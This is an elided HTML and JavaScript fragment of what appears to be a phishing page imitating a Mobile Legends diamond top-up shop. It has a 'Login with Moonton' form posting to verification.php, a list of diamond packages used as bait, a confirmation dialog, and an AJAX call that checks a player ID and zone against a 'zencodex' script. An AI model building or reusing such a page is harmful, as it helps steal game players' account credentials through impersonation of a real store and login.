         ...
         <div class="box-twitter">
            <center>
               <form action="verification.php" method="post">
                  <div class="txt-login-twitter">Login with Moonton</div>
         ...
         <section id="contents" class="main-content">
            ...
            <div class="section voucher">
               ...
               <ul class="vocherSelectionList ul-denoms voucher-denom-container">
                  ...
                  <li id="denomination_3753" class="voucher-list-element">
                     <a href="javascript:CODA.Shop.selectedPaymentChannelId=null;selectDenom([3753],0,false);">
                        <span class="element-check-label"></span>
                        774 Diamonds + 101 Bonus
                     </a>
                  </li>
                  <li id="denomination_3754" class="voucher-list-element">
                     <a href="javascript:CODA.Shop.selectedPaymentChannelId=null;selectDenom([3754],0,false);">
                        <span class="element-check-label"></span>
                        1708 Diamonds + 302 Bonus
                     </a>
                  </li>
                  <li id="denomination_3755" class="voucher-list-element">
                     <a href="javascript:CODA.Shop.selectedPaymentChannelId=null;selectDenom([3755],0,false);">
                        <span class="element-check-label"></span>
   ...
   <div style="display: none;" id="showKonfirm">
      <div tabindex="-1" role="dialog" class="ui-dialog ui-corner-all ui-widget ui-widget-content ui-front confirm-user-dialog__container ui-dialog-buttons ui-draggable" aria-describedby="confirm-user-dialog" aria-labelledby="ui-id-1" style="padding-top: 15px;">
         ...
         <div class="ui-dialog-buttonpane ui-widget-content ui-helper-clearfix">
            <div class="ui-dialog-buttonset"><button type="button" id="doConfirm" class="confirm-user-dialog__btn btn-blue ui-button ui-corner-all ui-widget">Konfirmasi</button></div>
         </div>
      </div>
   </div>
   <script>
   ...
   <script type="text/javascript">
      $(document).ready(function() {
         ...
         $("li.voucher-list-element").on('click', function() {
            ...
            var jumlahDiamonds = $(this).text();
            $("#jumlahDiamonds").empty();
            $("#jumlahDiamonds").append(jumlahDiamonds);
            ...
            $("#mdn-submit").on('click', function() {
               ...
               if (id == "" || zona == "") {
                  ...
                  $.ajax({
                     url: "../zencodex/mlCheckID.php",
                     type: "POST",
                     data: 'userID=' + id + '&zone=' + zona,
                     beforeSend: function() {
                        $("#overlay").hide();
                        $(".popError").hide();
                        $("#submit-loader").show();
